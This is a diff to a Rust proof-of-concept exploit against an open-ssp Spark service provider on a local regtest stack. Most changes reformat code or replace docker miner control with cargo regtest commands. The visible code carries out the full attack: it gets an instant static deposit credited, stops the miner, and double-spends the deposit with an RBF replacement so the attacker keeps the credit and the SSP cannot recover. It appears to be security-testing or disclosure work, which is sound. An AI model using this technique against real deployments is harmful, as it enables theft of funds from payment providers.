@@ -1,6 +1,6 @@
 //! PoC: theft from an open-ssp SSP via RBF double-spend of an instant static deposit.
 //!
-//! Runs against the open-ssp local regtest stack (docker-compose.regtest.yml,
+//! Runs against the open-ssp native regtest stack (`cargo regtest up`,
 //! project "open-ssp-regtest") with the SSP and all three Spark Operators
 //! running honest, unmodified code. Only the on-chain behavior is adversarial:
 //!
@@ -11,7 +11,7 @@
 //!   attacker with a higher fee and is mined; T1 never confirms. The attacker
 //!   keeps the Spark credit; the SSP's recovery can never complete.
 //!
-//! Installed and run by run.sh in the same directory (do not run directly).
+//! Run with cargo run --manifest-path e2e/breez/Cargo.toml --bin poc_instant_rbf.
 
 use std::{env, path::PathBuf, time::Duration};
 
@@ -65,7 +65,7 @@ impl Config {
             chain_service: optional_env("BREEZ_CHAIN_SERVICE_URL", "http://127.0.0.1:30000"),
             cert_dir: PathBuf::from(optional_env(
                 "POC_CERT_DIR",
-                root.join(".regtest/open-ssp-regtest/operator-certs")
+                root.join(".regtest/open-ssp-regtest/native/tls")
                     .to_str()
                     .expect("cert path"),
             )),
@@ -92,10 +92,13 @@ impl Rpc {
     // serde_json prints small BTC values like 7.5e-5. Format amounts as
     // 8-decimal strings inside a hand-built params array instead.
     async fn raw_wallet(&self, wallet: &str, method: &str, params_raw: &str) -> Result<Value> {
-        let url = format!("{}/wallet/{}", self.cfg.bitcoin_rpc.trim_end_matches('/'), wallet);
-        let body = format!(
-            r#"{{"jsonrpc":"1.0","id":"poc","method":"{method}","params":{params_raw}}}"#
+        let url = format!(
+            "{}/wallet/{}",
+            self.cfg.bitcoin_rpc.trim_end_matches('/'),
+            wallet
         );
+        let body =
+            format!(r#"{{"jsonrpc":"1.0","id":"poc","method":"{method}","params":{params_raw}}}"#);
         let response = self
             .client
             .post(&url)
@@ -105,7 +108,10 @@ impl Rpc {
             .send()
             .await
             .with_context(|| format!("bitcoind {method} request failed"))?;
-        let value: Value = response.json().await.context("bitcoind returned invalid JSON")?;
+        let value: Value = response
+            .json()
+            .await
+            .context("bitcoind returned invalid JSON")?;
         if !value["error"].is_null() {
             bail!("bitcoind {method}: {}", value["error"]);
         }
@@ -132,9 +138,15 @@ async fn http_json(client: &Client, url: &str, bearer: Option<&str>) -> Result<V
     if let Some(token) = bearer {
         request = request.bearer_auth(token);
     }
-    let response = request.send().await.with_context(|| format!("GET {url} failed"))?;
+    let response = request
+        .send()
+        .await
+        .with_context(|| format!("GET {url} failed"))?;
     let status = response.status();
-    let text = response.text().await.context("could not read HTTP response")?;
+    let text = response
+        .text()
+        .await
+        .context("could not read HTTP response")?;
     ensure!(status.is_success(), "GET {url}: HTTP {status}: {text}");
     serde_json::from_str(&text).with_context(|| format!("GET {url} did not return JSON"))
 }
@@ -151,7 +163,9 @@ async fn ssp_status(rpc: &Rpc) -> Result<Value> {
 async fn wallet_balance(sdk: &BreezSdk) -> Result<u64> {
     sdk.sync_wallet(SyncWalletRequest {}).await?;
     Ok(sdk
-        .get_info(GetInfoRequest { ensure_synced: Some(false) })
+        .get_info(GetInfoRequest {
+            ensure_synced: Some(false),
+        })
         .await?
         .balance_sats)
 }
@@ -205,8 +219,12 @@ async fn connect_attacker(cfg: &Config, storage: &TempDir) -> Result<BreezSdk> {
     let mut signing_operators = Vec::with_capacity(3);
     for (id, identity_public_key) in OPERATOR_IDENTITIES.iter().enumerate() {
         let cert_path = cfg.cert_dir.join(format!("server_{id}.crt"));
-        let ca_cert_pem = std::fs::read_to_string(&cert_path)
-            .with_context(|| format!("could not read {}; run cargo regtest certs", cert_path.display()))?;
+        let ca_cert_pem = std::fs::read_to_string(&cert_path).with_context(|| {
+            format!(
+                "could not read {}; run cargo regtest certs",
+                cert_path.display()
+            )
+        })?;
         signing_operators.push(SparkSigningOperator {
             id: id as u32,
             identifier: format!("{:064x}", id + 1),
@@ -245,28 +263,23 @@ async fn connect_attacker(cfg: &Config, storage: &TempDir) -> Result<BreezSdk> {
         .build()
         .await
         .context("could not connect attacker wallet")?;
-    sdk.get_info(GetInfoRequest { ensure_synced: Some(true) })
-        .await
-        .context("could not sync attacker wallet")?;
+    sdk.get_info(GetInfoRequest {
+        ensure_synced: Some(true),
+    })
+    .await
+    .context("could not sync attacker wallet")?;
     Ok(sdk)
 }
 
-async fn miner_container(action: &str) -> Result<()> {
-    let output = tokio::process::Command::new("docker")
-        .args([
-            "ps", "-aq", "--filter", "label=com.docker.compose.service=bitcoin-miner",
-        ])
-        .output()
-        .await
-        .context("could not list miner container")?;
-    let ids = String::from_utf8(output.stdout).context("docker output not UTF-8")?;
-    let id = ids.lines().next().context("bitcoin-miner container not found")?;
-    let status = tokio::process::Command::new("docker")
-        .args([action, id])
+async fn miner(action: &str) -> Result<()> {
+    let project = env::var("REGTEST_PROJECT").unwrap_or_else(|_| "open-ssp-regtest".into());
+    let status = tokio::process::Command::new("cargo")
+        .current_dir(PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../.."))
+        .args(["regtest", "--project", &project, "miner", action])
         .status()
         .await
-        .with_context(|| format!("could not docker {action} bitcoin-miner"))?;
-    ensure!(status.success(), "docker {action} bitcoin-miner failed");
+        .with_context(|| format!("could not {action} bitcoin-miner"))?;
+    ensure!(status.success(), "{action} bitcoin-miner failed");
     Ok(())
 }
 
@@ -274,9 +287,9 @@ async fn setup_attacker_wallet(rpc: &Rpc) -> Result<()> {
     let loaded: Vec<String> = serde_json::from_value(rpc.call("listwallets", json!([])).await?)?;
     if !loaded.iter().any(|w| w == "attacker") {
         let dir = rpc.call("listwalletdir", json!([])).await?;
-        let exists = dir["wallets"].as_array().is_some_and(|wallets| {
-            wallets.iter().any(|w| w["name"] == "attacker")
-        });
+        let exists = dir["wallets"]
+            .as_array()
+            .is_some_and(|wallets| wallets.iter().any(|w| w["name"] == "attacker"));
         if exists {
             rpc.call("loadwallet", json!(["attacker"])).await?;
         } else {
@@ -294,21 +307,29 @@ async fn setup_attacker_wallet(rpc: &Rpc) -> Result<()> {
         .await?;
     let address = address.as_str().context("no attacker address")?;
     for _ in 0..2 {
-        rpc.raw_wallet("default", "sendtoaddress", &format!(r#"["{address}",{}]"#, btc(10_000)))
-            .await?;
+        rpc.raw_wallet(
+            "default",
+            "sendtoaddress",
+            &format!(r#"["{address}",{}]"#, btc(10_000)),
+        )
+        .await?;
     }
     let mining = rpc.call("getnewaddress", json!([])).await?;
     rpc.call("generatetoaddress", json!([2, mining])).await?;
-    poll("attacker wallet funding", Duration::from_secs(120), || async {
-        let unspent = rpc
-            .call_wallet("attacker", "listunspent", json!([1, 9_999_999, [], true]))
-            .await?;
-        ensure!(
-            unspent.as_array().map_or(0, |u| u.len()) >= 2,
-            "attacker wallet has no confirmed funding outputs yet"
-        );
-        Ok(())
-    })
+    poll(
+        "attacker wallet funding",
+        Duration::from_secs(120),
+        || async {
+            let unspent = rpc
+                .call_wallet("attacker", "listunspent", json!([1, 9_999_999, [], true]))
+                .await?;
+            ensure!(
+                unspent.as_array().map_or(0, |u| u.len()) >= 2,
+                "attacker wallet has no confirmed funding outputs yet"
+            );
+            Ok(())
+        },
+    )
     .await
 }
 
@@ -319,7 +340,10 @@ async fn take_utxo(rpc: &Rpc, min_sats: u64) -> Result<(String, u32, u64)> {
     for utxo in unspent.as_array().context("listunspent not an array")? {
         let amount = sats_of(&utxo["amount"])?;
         if amount >= min_sats && utxo["spendable"].as_bool().unwrap_or(false) {
-            let txid = utxo["txid"].as_str().context("utxo has no txid")?.to_owned();
+            let txid = utxo["txid"]
+                .as_str()
+                .context("utxo has no txid")?
+                .to_owned();
             let vout = utxo["vout"].as_u64().context("utxo has no vout")? as u32;
             return Ok((txid, vout, amount));
         }
@@ -339,14 +363,20 @@ async fn craft_spend(
 ) -> Result<(String, String)> {
     let (txid, vout, value) = input;
     let total: u64 = outputs.iter().map(|(_, s)| s).sum();
-    ensure!(total + fee_sats <= *value, "outputs plus fee exceed the input value");
+    ensure!(
+        total + fee_sats <= *value,
+        "outputs plus fee exceed the input value"
+    );
     let mut outs = outputs.to_vec();
     let change = value - total - fee_sats;
     if change >= 546 {
         let address = rpc
             .call_wallet("attacker", "getnewaddress", json!(["", "bech32"]))
             .await?;
-        outs.push((address.as_str().context("no change address")?.to_owned(), change));
+        outs.push((
+            address.as_str().context("no change address")?.to_owned(),
+            change,
+        ));
     }
     let outputs_json = outs
         .iter()
@@ -357,18 +387,28 @@ async fn craft_spend(
         .raw_wallet(
             "attacker",
             "createrawtransaction",
-            &format!(r#"[ [{{"txid":"{txid}","vout":{vout},"sequence":{sequence}}}], [{outputs_json}] ]"#),
+            &format!(
+                r#"[ [{{"txid":"{txid}","vout":{vout},"sequence":{sequence}}}], [{outputs_json}] ]"#
+            ),
         )
         .await?;
-    let raw = raw.as_str().context("createrawtransaction returned no hex")?;
+    let raw = raw
+        .as_str()
+        .context("createrawtransaction returned no hex")?;
     let signed = rpc
-        .raw_wallet("attacker", "signrawtransactionwithwallet", &format!(r#"["{raw}"]"#))
+        .raw_wallet(
+            "attacker",
+            "signrawtransactionwithwallet",
+            &format!(r#"["{raw}"]"#),
+        )
         .await?;
     ensure!(
         signed["complete"].as_bool() == Some(true),
         "attacker wallet could not sign the transaction: {signed}"
     );
-    let hex = signed["hex"].as_str().context("signed transaction has no hex")?;
+    let hex = signed["hex"]
+        .as_str()
+        .context("signed transaction has no hex")?;
     let new_txid = if send {
         rpc.raw_wallet("attacker", "sendrawtransaction", &format!(r#"["{hex}"]"#))
             .await?
@@ -377,7 +417,10 @@ async fn craft_spend(
             .to_owned()
     } else {
         let decoded = rpc.call("decoderawtransaction", json!([hex])).await?;
-        decoded["txid"].as_str().context("decoded transaction has no txid")?.to_owned()
+        decoded["txid"]
+            .as_str()
+            .context("decoded transaction has no txid")?
+            .to_owned()
     };
     Ok((new_txid, hex.to_owned()))
 }
@@ -385,7 +428,10 @@ async fn craft_spend(
 #[tokio::main(flavor = "multi_thread")]
 async fn main() -> Result<()> {
     let cfg = Config::from_env();
-    let rpc = Rpc { client: Client::new(), cfg };
+    let rpc = Rpc {
+        client: Client::new(),
+        cfg,
+    };
     let cfg = &rpc.cfg;
 
     println!("=== PoC: RBF double-spend of an SSP instant static deposit ===");
@@ -393,18 +439,29 @@ async fn main() -> Result<()> {
 
     // ---- Preconditions: honest, unmodified stack with instant deposits on --
     let status = ssp_status(&rpc).await?;
-    ensure!(status["ldk_mode"] == "live", "SSP does not have a live backend");
     ensure!(
-        status["instant_deposits"]["max_outstanding_sats"].as_u64().unwrap_or(0) > 0
-            && status["instant_deposits"]["max_deposit_sats"].as_u64().unwrap_or(0) >= DEPOSIT_SATS,
+        status["ldk_mode"] == "live",
+        "SSP does not have a live backend"
+    );
+    ensure!(
+        status["instant_deposits"]["max_outstanding_sats"]
+            .as_u64()
+            .unwrap_or(0)
+            > 0
+            && status["instant_deposits"]["max_deposit_sats"]
+                .as_u64()
+                .unwrap_or(0)
+                >= DEPOSIT_SATS,
         "instant deposits are disabled; start the stack with \
          SSP_INSTANT_MAX_OUTSTANDING_SATS=100000 SSP_INSTANT_MAX_DEPOSIT_SATS=10000"
     );
     let ssp_before = status["spark"]["available_sats"]
         .as_u64()
         .context("SSP status has no available Spark balance")?;
-    println!("[setup] SSP available Spark liquidity: {ssp_before} sats; instant config: {}",
-        status["instant_deposits"]);
+    println!(
+        "[setup] SSP available Spark liquidity: {ssp_before} sats; instant config: {}",
+        status["instant_deposits"]
+    );
 
     // ---- Step 1: attacker controls confirmed utxos -------------------------
     setup_attacker_wallet(&rpc).await?;
@@ -415,7 +472,7 @@ async fn main() -> Result<()> {
     );
 
     // Deterministic timing: no block may confirm T1 before the double-spend.
-    miner_container("stop").await?;
+    miner("stop").await?;
     println!("[setup] stopped the auto-miner for deterministic timing");
 
     // ---- Step 2: static deposit address from the SSP flow ------------------
@@ -424,7 +481,9 @@ async fn main() -> Result<()> {
     let balance_before = wallet_balance(&sdk).await?;
     let deposit_address = sdk
         .receive_payment(ReceivePaymentRequest {
-            payment_method: ReceivePaymentMethod::BitcoinAddress { new_address: Some(false) },
+            payment_method: ReceivePaymentMethod::BitcoinAddress {
+                new_address: Some(false),
+            },
         })
         .await?
         .payment_request;
@@ -443,7 +502,9 @@ async fn main() -> Result<()> {
         true,
     )
     .await?;
-    let t1 = rpc.call("getrawtransaction", json!([t1_txid, true])).await?;
+    let t1 = rpc
+        .call("getrawtransaction", json!([t1_txid, true]))
+        .await?;
     let t1_vout = t1["vout"]
         .as_array()
         .context("T1 outputs missing")?
@@ -452,7 +513,9 @@ async fn main() -> Result<()> {
         .context("T1 deposit output missing")?["n"]
         .as_u64()
         .context("T1 deposit output has no index")? as u32;
-    let coin = rpc.call("gettxout", json!([t1_txid, t1_vout, true])).await?;
+    let coin = rpc
+        .call("gettxout", json!([t1_txid, t1_vout, true]))
+        .await?;
     ensure!(!coin.is_null(), "T1 output is not visible in the mempool");
     let entry = rpc.call("getmempoolentry", json!([t1_txid])).await?;
     println!(
@@ -460,7 +523,10 @@ async fn main() -> Result<()> {
          getmempoolentry ancestorcount={} bip125-replaceable={}",
         entry["ancestorcount"], entry["bip125-replaceable"]
     );
-    ensure!(entry["ancestorcount"].as_u64() == Some(1), "T1 must spend confirmed inputs");
+    ensure!(
+        entry["ancestorcount"].as_u64() == Some(1),
+        "T1 must spend confirmed inputs"
+    );
     let replaceable = entry["bip125-replaceable"].as_bool() == Some(true)
         || entry["bip125-replaceable"].as_str() == Some("yes");
     ensure!(replaceable, "T1 does not signal BIP125 replaceability");
@@ -503,7 +569,10 @@ async fn main() -> Result<()> {
     let attacker_return = rpc
         .call_wallet("attacker", "getnewaddress", json!(["", "bech32"]))
         .await?;
-    let attacker_return = attacker_return.as_str().context("no return address")?.to_owned();
+    let attacker_return = attacker_return
+        .as_str()
+        .context("no return address")?
+        .to_owned();
     let (t2_txid, _) = craft_spend(
         &rpc,
         &funding,
@@ -515,10 +584,19 @@ async fn main() -> Result<()> {
     .await?;
     let mining = rpc.call("getnewaddress", json!([])).await?;
     rpc.call("generatetoaddress", json!([1, mining])).await?;
-    let coin = rpc.call("gettxout", json!([t1_txid, t1_vout, true])).await?;
-    ensure!(coin.is_null(), "T1 output still exists after the double-spend");
-    let t1_tx = rpc.call_wallet("attacker", "gettransaction", json!([t1_txid])).await?;
-    let t2_conf = rpc.call_wallet("attacker", "gettransaction", json!([t2_txid])).await?;
+    let coin = rpc
+        .call("gettxout", json!([t1_txid, t1_vout, true]))
+        .await?;
+    ensure!(
+        coin.is_null(),
+        "T1 output still exists after the double-spend"
+    );
+    let t1_tx = rpc
+        .call_wallet("attacker", "gettransaction", json!([t1_txid]))
+        .await?;
+    let t2_conf = rpc
+        .call_wallet("attacker", "gettransaction", json!([t2_txid]))
+        .await?;
     println!(
         "[step 5] EVIDENCE: T2 {t2_txid} mined (confirmations={}); T1 evicted: \
          gettxout=null, wallet confirmations={} (conflicted)",
@@ -526,7 +604,7 @@ async fn main() -> Result<()> {
     );
 
     // ---- Step 6a: the stolen credit remains --------------------------------
-    miner_container("start").await?;
+    miner("start").await?;
     println!("[setup] restarted the auto-miner");
     rpc.call("generatetoaddress", json!([2, mining])).await?;
     tokio::time::sleep(Duration::from_secs(15)).await; // let the SSP worker cycle
@@ -542,7 +620,9 @@ async fn main() -> Result<()> {
 
     // ---- Step 6b: the SSP's recovery is permanently stuck ------------------
     let status = ssp_status(&rpc).await?;
-    let outstanding = status["instant_deposits"]["outstanding_sats"].as_u64().unwrap_or(0);
+    let outstanding = status["instant_deposits"]["outstanding_sats"]
+        .as_u64()
+        .unwrap_or(0);
     let settlements = http_json(
         &rpc.client,
         &format!("{}/admin/settlements", cfg.ssp_url),
@@ -562,11 +642,13 @@ async fn main() -> Result<()> {
     println!(
         "[step 6b] EVIDENCE: user-facing request record still reports the payout: {record_json}"
     );
-    ensure!(outstanding >= credit, "unexpected outstanding exposure {outstanding}");
+    ensure!(
+        outstanding >= credit,
+        "unexpected outstanding exposure {outstanding}"
+    );
     let stuck = settlements["unresolved"].as_array().is_some_and(|rows| {
-        rows.iter().any(|r| {
-            r["kind"] == "INSTANT_STATIC_DEPOSIT" && r["state"] == "TRANSFER_COMPLETED"
-        })
+        rows.iter()
+            .any(|r| r["kind"] == "INSTANT_STATIC_DEPOSIT" && r["state"] == "TRANSFER_COMPLETED")
     });
     ensure!(stuck, "no stuck INSTANT_STATIC_DEPOSIT settlement found");
 
